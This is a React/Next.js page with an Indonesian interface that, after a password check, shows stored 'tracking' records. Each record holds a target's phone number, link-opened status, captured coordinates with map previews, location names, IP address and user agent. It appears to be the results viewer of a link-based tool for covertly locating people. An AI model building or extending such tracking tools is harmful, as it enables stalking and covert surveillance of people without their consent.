'use client'

import { useState, use } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Label } from '@/components/ui/label'
import { Badge } from '@/components/ui/badge'
import { Separator } from '@/components/ui/separator'
import { Lock, Unlock, MapPin, User, Globe, Clock, ExternalLink, Eye, EyeOff } from 'lucide-react'
import type { Tracking } from '@/lib/db'

function formatDate(dateString: string | null) {
  if (!dateString) return '-'
  return new Date(dateString).toLocaleString('id-ID', {
    day: '2-digit',
    month: 'long',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  })
}

function StatusLinkBadge({ status }: { status: string }) {
  const variants: Record<string, 'default' | 'secondary' | 'destructive' | 'outline'> = {
    'active': 'default',
    'opened': 'secondary',
    'expired': 'destructive'
  }
  const labels: Record<string, string> = {
    'active': 'Aktif',
    'opened': 'Dibuka',
    'expired': 'Kadaluarsa'
  }
  return <Badge variant={variants[status] || 'outline'}>{labels[status] || status}</Badge>
}

function StatusLokasiBadge({ status }: { status: string }) {
  const colors: Record<string, string> = {
    'pending': 'bg-yellow-100 text-yellow-800',
    'gagal': 'bg-red-100 text-red-800',
    'Lokasi Didapatkan': 'bg-green-100 text-green-800'
  }
  const labels: Record<string, string> = {
    'pending': 'Menunggu',
    'gagal': 'Gagal',
    'Lokasi Didapatkan': 'Berhasil'
  }
  return (
    <span className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${colors[status] || 'bg-gray-100 text-gray-800'}`}>
      {labels[status] || status}
    </span>
  )
}

export default function ViewPage({ params }: { params: Promise<{ id: string }> }) {
  const { id } = use(params)
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [data, setData] = useState<Tracking | null>(null)
  const [showPassword, setShowPassword] = useState(false)

  const handleUnlock = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!password) {
      setError('Password wajib diisi')
      return
    }

    setLoading(true)
    setError('')

    try {
      const res = await fetch('/api/unlock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, password })
      })

      const json = await res.json()

      if (!res.ok) {
        throw new Error(json.error || 'Gagal membuka data')
      }

      setData(json.data)
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Terjadi kesalahan')
    } finally {
      setLoading(false)
    }
  }

  const googleMapsUrl = data?.latitude && data?.longitude 
    ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
    : null

  if (data) {
    return (
      <main className="min-h-screen bg-muted/30 p-4 md:p-8">
        <div className="mx-auto max-w-2xl space-y-6">
          <div className="text-center">
            <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-green-100">
              <Unlock className="h-6 w-6 text-green-600" />
            </div>
            <h1 className="text-2xl font-bold">Data Tracking</h1>
            <p className="text-muted-foreground">Data berhasil dibuka</p>
          </div>

          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <User className="h-5 w-5" />
                Informasi Target
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <Label className="text-muted-foreground">Nomor Target</Label>
                <p className="text-xl font-bold">{data.nomor_target}</p>
              </div>
              <Separator />
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="text-muted-foreground">Status Link</Label>
                  <div className="mt-1"><StatusLinkBadge status={data.status_link} /></div>
                </div>
                <div>
                  <Label className="text-muted-foreground">Status Lokasi</Label>
                  <div className="mt-1"><StatusLokasiBadge status={data.status_lokasi} /></div>
                </div>
              </div>
            </CardContent>
          </Card>

          {data.latitude && data.longitude && (
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <MapPin className="h-5 w-5" />
                  Lokasi
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label className="text-muted-foreground">Latitude</Label>
                    <p className="font-mono">{data.latitude}</p>
                  </div>
                  <div>
                    <Label className="text-muted-foreground">Longitude</Label>
                    <p className="font-mono">{data.longitude}</p>
                  </div>
                </div>

                {(data.city || data.province || data.country) && (
                  <>
                    <Separator />
                    <div className="grid grid-cols-3 gap-4">
                      {data.city && (
                        <div>
                          <Label className="text-muted-foreground">Kota</Label>
                          <p>{data.city}</p>
                        </div>
                      )}
                      {data.province && (
                        <div>
                          <Label className="text-muted-foreground">Provinsi</Label>
                          <p>{data.province}</p>
                        </div>
                      )}
                      {data.country && (
                        <div>
                          <Label className="text-muted-foreground">Negara</Label>
                          <p>{data.country}</p>
                        </div>
                      )}
                    </div>
                  </>
                )}

                <div className="aspect-video bg-muted rounded-lg overflow-hidden">
                  <iframe
                    width="100%"
                    height="100%"
                    frameBorder="0"
                    scrolling="no"
                    src={`https://www.openstreetmap.org/export/embed.html?bbox=${data.longitude - 0.01},${data.latitude - 0.01},${data.longitude + 0.01},${data.latitude + 0.01}&layer=mapnik&marker=${data.latitude},${data.longitude}`}
                    title="OpenStreetMap Preview"
                  />
                </div>

                {googleMapsUrl && (
                  <Button variant="outline" className="w-full" asChild>
                    <a href={googleMapsUrl} target="_blank" rel="noopener noreferrer">
                      <ExternalLink className="mr-2 h-4 w-4" />
                      Buka di Google Maps
                    </a>
                  </Button>
                )}
              </CardContent>
            </Card>
          )}

          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Globe className="h-5 w-5" />
                Informasi Perangkat
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              {data.ip && (
                <div>
                  <Label className="text-muted-foreground">IP Address</Label>
                  <p className="font-mono">{data.ip}</p>
                </div>
              )}
              {data.user_agent && (
                <div>
                  <Label className="text-muted-foreground">User Agent</Label>
                  <p className="text-xs text-muted-foreground break-all">{data.user_agent}</p>
                </div>
              )}
              {!data.ip && !data.user_agent && (
                <p className="text-muted-foreground text-center py-4">
                  Belum ada data perangkat
                </p>
              )}
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Clock className="h-5 w-5" />
                Waktu
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="text-muted-foreground">Dibuat</Label>
                  <p className="text-sm">{formatDate(data.created_at)}</p>
                </div>
                <div>
                  <Label className="text-muted-foreground">Kadaluarsa</Label>
                  <p className="text-sm">{formatDate(data.expired_at)}</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen flex items-center justify-center p-4 bg-muted/30">
      <Card className="w-full max-w-md">
        <CardHeader className="text-center">
          <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
            <Lock className="h-6 w-6 text-primary" />
          </div>
          <CardTitle className="text-2xl">Data Terlindungi</CardTitle>
          <CardDescription>
            Masukkan password untuk melihat data tracking
          </CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleUnlock} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="password">Password</Label>
              <div className="relative">
                <Input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Masukkan password..."
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  disabled={loading}
                  className="pr-10"
                />
                <button
                  type="button"
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </button>
              </div>
            </div>
            {error && (
              <p className="text-sm text-destructive">{error}</p>
            )}
            <Button type="submit" className="w-full" disabled={loading}>
              <Unlock className="mr-2 h-4 w-4" />
              {loading ? 'Memverifikasi...' : 'Buka Data'}
            </Button>
          </form>
          <p className="mt-4 text-xs text-center text-muted-foreground">
            ID: {id}
          </p>
        </CardContent>
      </Card>
    </main>
  )
}
